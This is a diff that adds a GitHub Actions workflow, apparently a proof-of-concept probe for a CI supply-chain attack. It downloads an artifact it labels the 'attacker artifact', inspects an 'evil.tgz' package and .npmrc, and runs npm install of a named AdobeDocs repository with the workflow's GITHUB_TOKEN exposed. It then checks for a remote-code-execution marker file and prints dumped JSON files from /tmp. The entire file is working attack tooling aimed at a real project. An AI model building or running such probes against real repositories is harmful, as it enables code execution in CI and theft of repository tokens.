@@ -1,0 +1,37 @@
+name: npmprobe7
+on: workflow_dispatch
+
+permissions:
+  pull-requests: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: download attacker artifact from Lint run
+        uses: actions/download-artifact@v8
+        with:
+          name: linter-report
+          run-id: 41068316757
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: inspect workspace
+        run: |
+          echo "=== ls ==="; ls -la
+          echo "=== package.json ==="; cat package.json
+          echo "=== .npmrc ==="; cat .npmrc 2>&1
+          echo "=== tgz ==="; tar tzvf evil.tgz
+
+      - name: exact target step
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GITHUB_REPOSITORY: ${{ github.repository }}
+          LINTER_REPORT_PATH: ./linter-report.txt
+          PR_NUMBER_PATH: ./pr-number.txt
+        run: |
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -30 || echo "npm exit=$?"
+          echo "=== ls after ==="; ls -la
+          echo "=== marker /tmp/.rce.done: $([ -f /tmp/.rce.done ] && echo YES || echo NO) ==="
+          echo "=== c.json ==="; head -c 200 /tmp/c.json 2>/dev/null; echo
+          echo "=== rev.json ==="; head -c 200 /tmp/rev.json 2>/dev/null; echo
+          echo "=== repo.json ==="; head -c 400 /tmp/repo.json 2>/dev/null; echo
